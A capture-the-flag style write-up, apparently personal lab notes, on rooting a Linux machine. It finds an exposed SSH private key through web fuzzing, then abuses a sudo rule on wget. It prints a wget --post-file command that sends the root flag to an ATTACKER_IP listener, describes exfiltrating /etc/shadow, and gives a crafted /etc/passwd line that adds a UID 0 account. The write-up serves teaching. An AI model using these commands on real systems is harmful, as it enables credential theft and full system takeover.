# Linux Privilege Escalation via Exposed SSH Private Key and SUDO Wget

## Attack Overview

The objective of this machine was to gain initial access by discovering an exposed SSH private key, then escalate privileges by abusing a misconfigured **SUDO** rule that allowed the execution of **wget** as **root**.

---

# Nmap Enumeration

The first step was to scan the target and identify the exposed services.

![[Pasted image 20260717224658.png]]

---

# Web Directory Enumeration

Performed directory fuzzing to discover hidden resources.

![[Pasted image 20260717224755.png]]

A hidden directory was discovered.

![[Pasted image 20260717224812.png]]

---

# Discovering the `.ssh` Directory

Performed another round of fuzzing against the newly discovered directory.

This revealed an exposed **.ssh** directory.

![[Pasted image 20260717224942.png]]

---

# Extracting the SSH Private Key

Inside the exposed directory, an SSH private key was found.

![[Pasted image 20260717225033.png]]

Before using it, its permissions had to be restricted.

```
chmod 600 id_rsa
```

![[Pasted image 20260717225116.png]]

SSH refuses to use private keys that are readable by other users, so changing the permissions to **600** is required.

---

# Enumerating the Username

A private key alone is not enough to authenticate.

A valid username is also required.

After reviewing the source code of the main page, a username was discovered.

![[Pasted image 20260717225237.png]]

---

# Initial Access

Used the discovered username together with the private key to authenticate via SSH.

![[Pasted image 20260717225355.png]]

Successfully obtained an initial shell on the target machine.

---

# Privilege Escalation Enumeration

Enumerated SUDO permissions.

```
sudo -l
```

![[Pasted image 20260717225638.png]]

The output showed that **wget** could be executed with **root privileges**.

---

# Understanding the Vulnerability

`wget` is normally used to download files.

However, it also supports sending local files to a remote server using the **--post-file** option.

When executed through **sudo**, it can read files that only **root** has permission to access.

This allows sensitive files such as:

- `/root/root.txt`
- `/etc/shadow`
- `/etc/passwd`

to be exfiltrated.

---

# Method 1 — Reading the Root Flag

The first technique is simply sending the root flag to our attacking machine.

Start a Netcat listener.

![[Pasted image 20260717230303.png]]

Then execute:

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://ATTACKER_IP:PORT
```

![[Pasted image 20260717230327.png]]

The listener receives the contents of the file.

![[Pasted image 20260717230412.png]]

---

# Method 2 — Dumping `/etc/shadow`

Another option is to exfiltrate the shadow file.

The password hashes can then be cracked using tools such as:

- John the Ripper
- Hashcat

However, this method is not guaranteed because the passwords may be too strong to crack.

---

# Method 3 — Creating a New Root User (Recommended)

A more reliable approach is to modify the **passwd** file.

First, download the original file.

![[Pasted image 20260717230713.png]]

---

# Generating a Password Hash

Linux passwords stored inside `/etc/passwd` must be hashed.

A password hash can be generated using OpenSSL.

```
openssl passwd PASSWORD
```

![[Pasted image 20260717231002.png]]

---

# Adding a New Root User

Append a new entry to the passwd file.

```
mrwan:$1$0xLfcJG4$owY8jcczkoygh6TAUSrTN0:0:0:/root:/bin/bash
```

![[Pasted image 20260717231242.png]]

### Field Breakdown

```
username:password_hash:UID:GID:comment:home_directory:shell
```

Since both **UID** and **GID** are set to **0**, the new account is treated as a **root user**.

---

# Hosting the Modified File

Start a simple HTTP server.

![[Pasted image 20260717231842.png]]

Transfer the modified passwd file back to the target using wget.

![[Pasted image 20260717231932.png]]

Once the file is replaced, log in using the newly created account and the password used to generate the hash.

This provides full **root privileges**.

---

# Key Concepts

## SSH Private Key Exposure

If an SSH private key is accidentally exposed through the web server or another service, anyone who also discovers the corresponding username can authenticate without knowing the password.

---

## SUDO Misconfiguration

Granting SUDO permissions to seemingly harmless binaries can still be dangerous.

Many legitimate Linux utilities can be abused to perform privileged actions.

This is why **GTFOBins** is an essential resource during privilege escalation.

---

## Why Wget Is Dangerous

Although `wget` is designed for downloading files, the **--post-file** option allows it to upload arbitrary local files.

When executed with root privileges, it becomes a powerful file exfiltration tool capable of reading files that normal users cannot access.

---

# Summary

During this machine:

1. Enumerated the target using Nmap.
2. Discovered hidden directories through web fuzzing.
3. Found an exposed `.ssh` directory.
4. Downloaded an SSH private key.
5. Identified a valid username from the website source code.
6. Logged in via SSH using key-based authentication.
7. Enumerated SUDO permissions.
8. Abused `wget` running as root.
9. Demonstrated multiple privilege escalation techniques:
   - Reading the root flag.
   - Dumping `/etc/shadow`.
   - Modifying `/etc/passwd` to create a new root account.
10. Obtained full root access.